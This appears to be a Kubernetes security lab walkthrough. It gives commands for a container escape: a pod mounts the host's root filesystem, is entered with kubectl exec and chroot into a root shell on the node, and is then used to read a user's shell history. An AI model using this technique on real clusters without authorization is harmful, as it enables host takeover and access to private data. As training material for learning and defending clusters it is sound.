# Bonus Walkthroughs

## Challenge 1

Get a root shell on the `cluster` `node` again. Find out the image name that was last run directly with docker commands by the `kubernetes` user.

1. Create a "hostpath volume mount" `pod` manifest.

    ```console
    cat > hostpath.yml <<EOF
    ---
    apiVersion: v1
    kind: Pod
    metadata:
      name: hostpath
    spec:
      containers:
      - name: hostpath
        image: busybox:latest
        command:
          - sleep
          - "86400"
        volumeMounts:
          - name: rootfs
            mountPath: /rootfs
      restartPolicy: Always
      volumes:
        - name: rootfs
          hostPath:
            path: /
    EOF
    ```

1. Create the `pod` that mounts the host filesystem's `/` at `/rootfs` inside the container.

    ```console
    kubectl apply -f hostpath.yml
    ```
   
1. Use `kubectl exec` to get a shell inside the `hostpath` `pod` in the `default` `namespace`.

    ```console
    kubectl exec -it hostpath /bin/sh
    ```
    
1. Use the `chroot` command to switch the filesystem root to the `/rootfs` of the container and run a `bash` shell.

    ```console
    chroot /rootfs /bin/bash
    ```

1. Navigate to the home directory of the `kubernetes` user on the host filesystem, and examine the shell history for the image that was run manually with a `docker run` invocation.

    ```console
    cd /home/kubernetes
    ls
    ```

    ```console
    cat .bash_history
    ```

1. Exit from the `chroot` shell.
    
    ```console
    exit
    ```
1. Exit from the `kubectl exec` into the `pod`.
    
    ```console
    exit
    ```

1. Clean up after our `pod` escape.
    
    ```console
    kubectl delete -f hostpath.yml
    ```
